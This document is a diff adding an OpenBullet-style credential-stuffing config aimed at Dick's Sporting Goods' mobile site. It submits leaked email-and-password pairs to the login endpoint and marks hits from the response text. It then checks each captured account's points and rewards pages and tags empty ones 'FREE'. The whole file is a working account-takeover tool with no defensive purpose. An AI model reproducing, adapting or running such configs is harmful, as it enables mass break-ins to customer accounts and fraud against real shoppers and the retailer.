@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Dicks Sporting Goods",
+  "SuggestedBots": 50,
+  "LastModified": "2018-06-08T18:11:15.8788563+00:00",
+  "AdditionalInfo": "",
+  "Author": "Rebel",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://m.dickssportinggoods.com/Logon" AutoRedirect=TRUE 
+  CONTENT "storeId=15108&catalogId=12301&reLogonURL=LogonForm&myAcctMain=1&fromOrderId=*&toOrderId=**&deleteIfEmpty=*&continue=1&createIfEmpty=1&calculationUsageId=-1&updatePrices=0&outMerge=**&errorViewName=AjaxOrderItemDisplayView&previousPage=logon&returnPage=&URL=RESTOrderCalculate%3FURL%3Dhttps%3A%2F%2Fwww.dickssportinggoods.com%2FLogonForm%3FcatalogId%3D12301%26amp%3BlangId%3D-1%26amp%3BstoreId%3D15108%26amp%3BcalculationUsageId%3D-1%26amp%3BcalculationUsageId%3D-2%26amp%3BdeleteCartCookie%3Dtrue%26amp%3Bpage%3D&myAcctMain=1&logonId=<USER>&logonPassword=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://m.dickssportinggoods.com/webapp/wcs/stores/servlet/LogonForm?catalogId=12301&langId=&storeId=15108&storeId=15108&krypto=OG%2BC8s54WKXXXIPs3I0RXKmUTVZp9AwISgMk6AjxmMl3D3po44oT4z%2FMs7YNKxYaG2m8ynhJl8z3CHgcZLgVUYH8fnG3e90M6ZnlGm5udXPHklNpl5sZu7ahrUUVnkX%2F&ddkey=https%3ALogoff" 
+  HEADER "origin: https://m.dickssportinggoods.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"PageName\": \"Account Summary\"" 
+  KEYCHAIN Failure AND 
+    KEY "\"PageName\": \"Sign In\"" 
+    KEY "To sign in, please enter a valid email address and password" 
+REQUEST GET "https://m.dickssportinggoods.com/MyPointsHistoryView?catalogId=12301&langId=-1&storeId=15108" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You have no points history." 
+REQUEST GET "" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You do not have any rewards data" 
